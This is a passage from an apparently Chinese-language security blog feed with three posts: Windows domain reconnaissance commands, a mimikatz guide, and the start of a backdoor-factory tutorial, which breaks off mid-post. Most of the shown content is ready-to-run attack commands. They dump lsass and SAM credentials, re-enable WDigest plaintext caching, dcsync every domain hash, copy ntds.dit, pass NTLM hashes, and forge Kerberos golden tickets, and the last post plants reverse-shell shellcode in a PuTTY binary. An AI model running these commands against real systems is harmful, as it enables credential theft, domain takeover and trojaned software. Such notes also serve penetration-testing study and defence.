class="hljs-symbol">root</span>\<span class="hljs-symbol">cimv2</span>\<span class="hljs-symbol">terminalservices</span> <span class="hljs-symbol">path</span> <span class="hljs-symbol">win32_terminalservicesetting</span> <span class="hljs-symbol">where</span> (<span class="hljs-symbol">__CLASS</span> !=&quot;&quot;) <span class="hljs-symbol">call</span> <span class="hljs-symbol">setallowtsconnections</span> <span class="hljs-symbol">1</span><br>//修改注册表方式<br><span class="hljs-symbol">reg</span> <span class="hljs-symbol">query</span> &quot;<span class="hljs-symbol">HKLM</span>\<span class="hljs-symbol">System</span>\<span class="hljs-symbol">CURRENT</span>\<span class="hljs-symbol">CONTROLSET</span>\<span class="hljs-symbol">CONTROL</span>\<span class="hljs-symbol">TERMINAL</span> <span class="hljs-symbol">SERVER</span>&quot; /<span class="hljs-symbol">v</span> <span class="hljs-symbol">fSingleSessionPerUser</span> /<span class="hljs-symbol">t</span> <span class="hljs-symbol">REG_DWORD</span> /<span class="hljs-symbol">d</span> <span class="hljs-symbol">0</span> /<span class="hljs-symbol">f</span><br></code></pre></td></tr></table></figure><h3 id="2-2-2-自动收集信息"><a href="#2-2-2-自动收集信息" class="headerlink" title="2.2.2 自动收集信息"></a>2.2.2 自动收集信息</h3><p>这里原文将上述的语句进行自动化，并将结果输出到了一个HTML文件中。</p><h3 id="2-2-3-Empire下的主机信息收集"><a href="#2-2-3-Empire下的主机信息收集" class="headerlink" title="2.2.3 Empire下的主机信息收集"></a>2.2.3 Empire下的主机信息收集</h3><p>使用模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule situational_awareness<span class="hljs-regexp">/host/</span>winenum<br>execute<br></code></pre></td></tr></table></figure><h2 id="2-3-查询当前权限"><a href="#2-3-查询当前权限" class="headerlink" title="2.3 查询当前权限"></a>2.3 查询当前权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><p>查询指定用户的详细信息</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span> /domain<br></code></pre></td></tr></table></figure><h2 id="2-4-判断是否存在域"><a href="#2-4-判断是否存在域" class="headerlink" title="2.4 判断是否存在域"></a>2.4 判断是否存在域</h2><p>查看dns服务器</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gml">ipconfig /<span class="hljs-literal">all</span><br><span class="hljs-comment">//将查看到的DNS服务器用nslookup进行解析</span><br>nslookup dc.test.<span class="hljs-symbol">local</span><br></code></pre></td></tr></table></figure><p>查看系统详细信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">systeminfo | findstr <span class="hljs-regexp">/B /</span>C:<span class="hljs-string">&quot;登录服务器&quot;</span><br><span class="hljs-regexp">//</span>如果结果不为<span class="hljs-string">&quot;WORKGROUP&quot;</span>则主机为域主机<br></code></pre></td></tr></table></figure><p>查询当前登录域及登录用户信息</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">workstation</span><br></code></pre></td></tr></table></figure><p>判断主域</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net time /<span class="hljs-built_in">domain</span><br><span class="hljs-comment">//命令用于查看域内时间，同时也可以查看域控制器</span><br></code></pre></td></tr></table></figure><h2 id="2-5-探测域内存活主机"><a href="#2-5-探测域内存活主机" class="headerlink" title="2.5 探测域内存活主机"></a>2.5 探测域内存活主机</h2><p>使用nbtscan(<a href="http://www.unixwiz.net/tools/nbtscan.html)%E6%8E%A2%E6%B5%8B%E5%BD%93%E5%89%8D%E7%BD%91%E6%AE%B5%E4%B8%BB%E6%9C%BA">http://www.unixwiz.net/tools/nbtscan.html)探测当前网段主机</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nbt</span>.exe <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>使用ICMP探测</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br></code></pre></td></tr></table></figure><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-s5HEC2y4-1611211198738)(2.内网信息收集.assets&#x2F;1580203080227.png)]</p><p>通过ARPscan工具扫描探测内网</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>.exe -t <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>Empire中的ARPscan模块</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemode situational_awareness<span class="hljs-regexp">/network/</span>arpscan<br>execute<br></code></pre></td></tr></table></figure><p>Nishang中的Invoke-ARPScan.ps1</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell.exe -exec bypass -Command &quot;&amp; (Import-module c:\windows\temp\Invoke-ARPscan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20)&quot; &gt;&gt; c:\windows\<span class="hljs-keyword">temp</span>\<span class="hljs-keyword">log</span>.txt<br><span class="hljs-keyword">type</span> c:\windows\<span class="hljs-keyword">temp</span>\<span class="hljs-keyword">log</span>.txt<br></code></pre></td></tr></table></figure><p>通过常规的TCP&#x2F;UDP端口扫描探测内网</p><p>上传ScanLine进行扫描：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">scanline</span> -h -t <span class="hljs-number">22</span>,<span class="hljs-number">80</span>-<span class="hljs-number">90</span>,<span class="hljs-number">110</span>,<span class="hljs-number">445</span> -u <span class="hljs-number">53</span>,<span class="hljs-number">161</span> -O c:\windows\temp\log.txt -p <span class="hljs-number">192.168.1.1</span>-<span class="hljs-number">254</span> /b<br></code></pre></td></tr></table></figure><h2 id="2-6扫描域内端口"><a href="#2-6扫描域内端口" class="headerlink" title="2.6扫描域内端口"></a>2.6扫描域内端口</h2><p>telnet(但是这个速度太慢了点)</p><p>S扫描器</p><p>Metasploit端口扫描</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">auxiliary/scanner/portscan/tcp<br><span class="hljs-keyword">set</span> ports <span class="hljs-comment">1-1000</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">RHOST 192.168.1.1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">THREADS 10</span><br>run<br></code></pre></td></tr></table></figure><p>PowerSploit、NiShang的Invoke-portscan脚本</p><h2 id="2-7-收集域内基础信息"><a href="#2-7-收集域内基础信息" class="headerlink" title="2.7 收集域内基础信息"></a>2.7 收集域内基础信息</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain<br><span class="hljs-comment">//查询域</span><br><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain:<span class="hljs-keyword">test</span><br><span class="hljs-comment">//查询域内所有计算机</span><br><br><span class="hljs-keyword">net</span> group /domain<br><span class="hljs-comment">//查询域内所有用户组列表</span><br><br><span class="hljs-keyword">net</span> group <span class="hljs-string">&quot;domain computers&quot;</span> /domain<br><span class="hljs-comment">//查询所有域成员计算机列表</span><br><br><span class="hljs-keyword">net</span> accounts /domain<br><span class="hljs-comment">//获取域内密码信息</span><br><br>nltest /domain_trusts<br><span class="hljs-comment">//域内信任信息</span><br></code></pre></td></tr></table></figure><h2 id="2-8-查找域控"><a href="#2-8-查找域控" class="headerlink" title="2.8 查找域控"></a>2.8 查找域控</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>可以看，域控制器的机器名<br>nltest /DCLIST:test<br><span class="hljs-regexp">//</span>查询当前时间<br>net time /domain<br><span class="hljs-regexp">//</span>查询域控制器的主机名<br>Nslookup -type=SRV _ldap._tcp<br><span class="hljs-regexp">//</span>查询域控制器组<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br><span class="hljs-regexp">//</span>查看主控制器，可以看见域控制器的机器名<br>netdom query pdc<br></code></pre></td></tr></table></figure><h2 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>查询所有域用户列表<br>net user /domain<br><br><span class="hljs-regexp">//</span>获取域内用户的详细信息<br>wmic useraccount get /all<br><br><span class="hljs-regexp">//</span>查看存在的用户,但是这个只能在域控或者安装了对应服务的主机使用，否则会提示命令不存在<br>dsquery user<br><br><span class="hljs-regexp">//</span>查找目录中的计算机<br>dsquery computer<br><br><span class="hljs-regexp">//</span>查询本地管理员组用户<br>net localgroup administrators<br><br><span class="hljs-regexp">//</span>查询域管理员用户组<br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>查询管理员用户组<br>net group <span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p>2.10 定位域管理员</p><p>在获取了Windows域中的普通权限在进行横向渗透时，需要知道域内用户登录的位置，是否是任何系统&#x2F;主机的本地管理员，以及所属组等信息。能够使用的工具有：psloggedon.exe、PVEFindADUser.exe、netness.exe、hunter、NetView、PowerView。</p><p>psloggedon.exe等</p><p>能够通过此工具查看远程计算机的资源，也就是说能够查看目标主机有哪些账户在登录状态</p><p>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon</a></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">psloggedon.exe <span class="hljs-string">\\dc2012</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121144105755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>PVEFindADUser</p><p>PVEFindADUser能够用于查找活动目录用户登录的位置，枚举与用户，以及查找在特定计算机上登录的用户。包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。（这个工具需要.NET 3.5）</p><p>Windows Server 2012安装.NET 3.5可能不成功，需要指定安装源：</p><p><img src="https://img-blog.csdnimg.cn/20210121144258691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">PVEFindADUser.exe -<span class="hljs-literal">current</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012114432143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>NetView</p><p>NetView是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。同时还能够查询共享入口和有价值的用户。</p><p>下载地址：<a href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p><p>Netness</p><p>PowerView</p><p>使用Powerview的Invoke-UserHunter。</p><p> Empire</p><p>Empire中也存在此类型的脚本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule situational_awareness<span class="hljs-regexp">/network/</span>powerview/user_hunter<br>execute<br></code></pre></td></tr></table></figure><p>Nmap的NSE脚本</p><p>通过Nmap的NSE脚本获取远程机器的登陆会话。</p><p>smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></p><p>smb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。</p><p>smb-enum-users.nse可以使用此脚本对域控进行扫描。</p><p> 2.11 查找域管理进程</p><p>其中阿里云上有个链接也说到了类似的方法：<a href="https://yq.aliyun.com/articles/599377?type=2">https://yq.aliyun.com/articles/599377?type=2</a></p><p>本机检查：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>获取域管理员列表<br>net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>列出本机的所有进程和进程用户<br>tasklist /v<br></code></pre></td></tr></table></figure><p>查询域控的域用户会话</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>查询域控列表<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>收集所有活动域的会话列表<br>netsess -h<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mimikatz使用</title>
    <link href="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</p><h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><p><strong>- 获取本地账号密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#提升权限</span><br>privilege::debug<br><br><span class="hljs-comment">#抓取密码</span><br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404131800192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当目标为win10或者2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。<br>cmd修改注册表命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><p><strong>-  SAM表获取hash</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#导出SAM数据</span><br>reg save HKLM\SYSTEM SYSTEM<br>reg save HKLM\SAM SAM<br><br><span class="hljs-comment">#使用mimikatz提取hash</span><br>lsadump::sam /sam:SAM /system:SYSTEM<br></code></pre></td></tr></table></figure><p><strong>- Procdump+Mimikatz</strong><br>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404174413894.png" alt="在这里插入图片描述"></p><p>将lsass.dmp下载到本地后，然后执行mimikatz:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br></code></pre></td></tr></table></figure><p>为了方便复制与查看，可以输出到本地文件里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe  sekurlsa::logonPasswords full &gt; pssword.txt<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404181255285.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210404181332603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>读取域控中域成员Hash</strong><br>域控以上域管理员身份执行mimikatz</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#提升权限</span><br>privilege::debug<br>抓取密码<br>lsadump::lsa /patch<br></code></pre></td></tr></table></figure><p>方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取所有域用户</span><br>lsadump::dcsync /domain:test.com /all /csv<br><br><span class="hljs-comment">#指定获取某个用户的hash</span><br>lsadump::dcsync /domain:test.com /user:<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><ul><li><strong>导出域成员Hash</strong><br>域账户的用户名和hash密码以域数据库的形式存放在域控制器的%SystemRoot%\ntds\NTDS.DIT文件中。<br>这里可以借助: ntdsutil.exe,域控制器自带的域数据库管理工具，我们可以通过域数据库，提取域种所有的域用户信息，在域控上执行如下命令，导入域数据库。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建快照</span><br>ntdsutil snapshot <span class="hljs-string">&quot;activate instance ntds&quot;</span> create quit quit<br><br><span class="hljs-comment">#加载快照</span><br>ntdsutil snapshot <span class="hljs-string">&quot;mount &#123;72ba82f0-5805-4365-a73c-0ccd01f5ed0d&#125;&quot;</span> quit quit<br><br><span class="hljs-comment">#Copy文件副本</span><br>copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit<br></code></pre></td></tr></table></figure><ul><li><strong>哈希传递攻击</strong><br>当我们获得了一台主机得NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用administrator用户的NTLM哈希值进行攻击</span><br>sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用xie用户的NTLM哈希值进行攻击</span><br>sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9<br></code></pre></td></tr></table></figure><p><strong>- 域环境</strong><br>在域环境中，当我们获取得了域内用户得HTML哈希值，我们可以使用域内得一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机得本地administrator权限和获得了域内用户得NTLM哈希值<br>域：xie.com<br>域控：WIN2008.xie.com</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击</span><br>sekurlsa::pth /user:administrator /domain:<span class="hljs-string">&quot;xie.com&quot;</span> /ntlm:dbd621b8ed24eb627d32514476fac6c5 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击</span><br>sekurlsa::pth /user:xie /domain:<span class="hljs-string">&quot;xie.com&quot;</span> /ntlm:329153f560eb329c0e1deea55e88a1e9   <br></code></pre></td></tr></table></figure><h2 id="票据传递攻击PPT"><a href="#票据传递攻击PPT" class="headerlink" title="票据传递攻击PPT"></a>票据传递攻击PPT</h2><p><strong>- 黄金票据</strong><br>域内每个用户得ticket都是由krbtgt的密码hash来计算生成的，因此只要获取到了krbtgt用户的密码Hash，就可以随意伪造Ticket,进而使用Ticket登录域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket,此类攻击方法被称为票据传递攻击。<br>首先获取krbtgt的用户hash:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;lsadump::dcsync /domain:xx.com /user:krbtgt&quot;</span><br></code></pre></td></tr></table></figure><p>利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#导入刚才生成的票据</span><br>kerberos::ptt test.kiribi<br><br><span class="hljs-comment">#导入成功后可获取域管权限</span><br><span class="hljs-built_in">dir</span> \\dc.abc.com\c$<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>mimikatz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>backdoor-factory工具使用</title>
    <link href="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/"/>
    <url>/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>backdoor-factory是一款后门构建工具。与其他工具不同的是，他不会增加软件的大小，而是利用代码缝隙进行注入，免杀效果更好。<br>项目地址： <a href="https://github.com/secretsquirrel/the-backdoor-factory.git">https://github.com/secretsquirrel/the-backdoor-factory.git</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里我在ubuntu的机子上安全，这里选择安装的机制最好内置的是Python2.7的环境不然要出问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html<br>git <span class="hljs-built_in">clone</span> https://github.com/secretsquirrel/the-backdoor-factory.git<br>sudo pip install capstone<br></code></pre></td></tr></table></figure><p>下载好后进入目录<br><img src="https://img-blog.csdnimg.cn/20210425101206929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210425101235182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>安装成功</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>backdoor-factory常用命令<br>-h                  查看帮助信息</p><p>-f                   测试指定文件</p><p>-S                  检查软件是否支持patch</p><p>-s                   指定payload，可以通过”show”来查看</p><p>-H                  指定回连的IP地址</p><p>-P                  指定回连的端口</p><p>-J                   使用多个代码缝隙注入</p><p>-c                   查看软件的代码缝隙</p><p>-l   num          和” -c” 一起使用,查看大于num的缝隙</p><p>-o                   指定输出软件的名称<br><img src="https://img-blog.csdnimg.cn/20210425101622640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到是支持patch的，可以继续<br>接下来插shellcode<br>先查看可用的payload         -s show<br><img src="https://img-blog.csdnimg.cn/20210425101752159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我选择   iat_reverse_tcp_stager_threaded<br><img 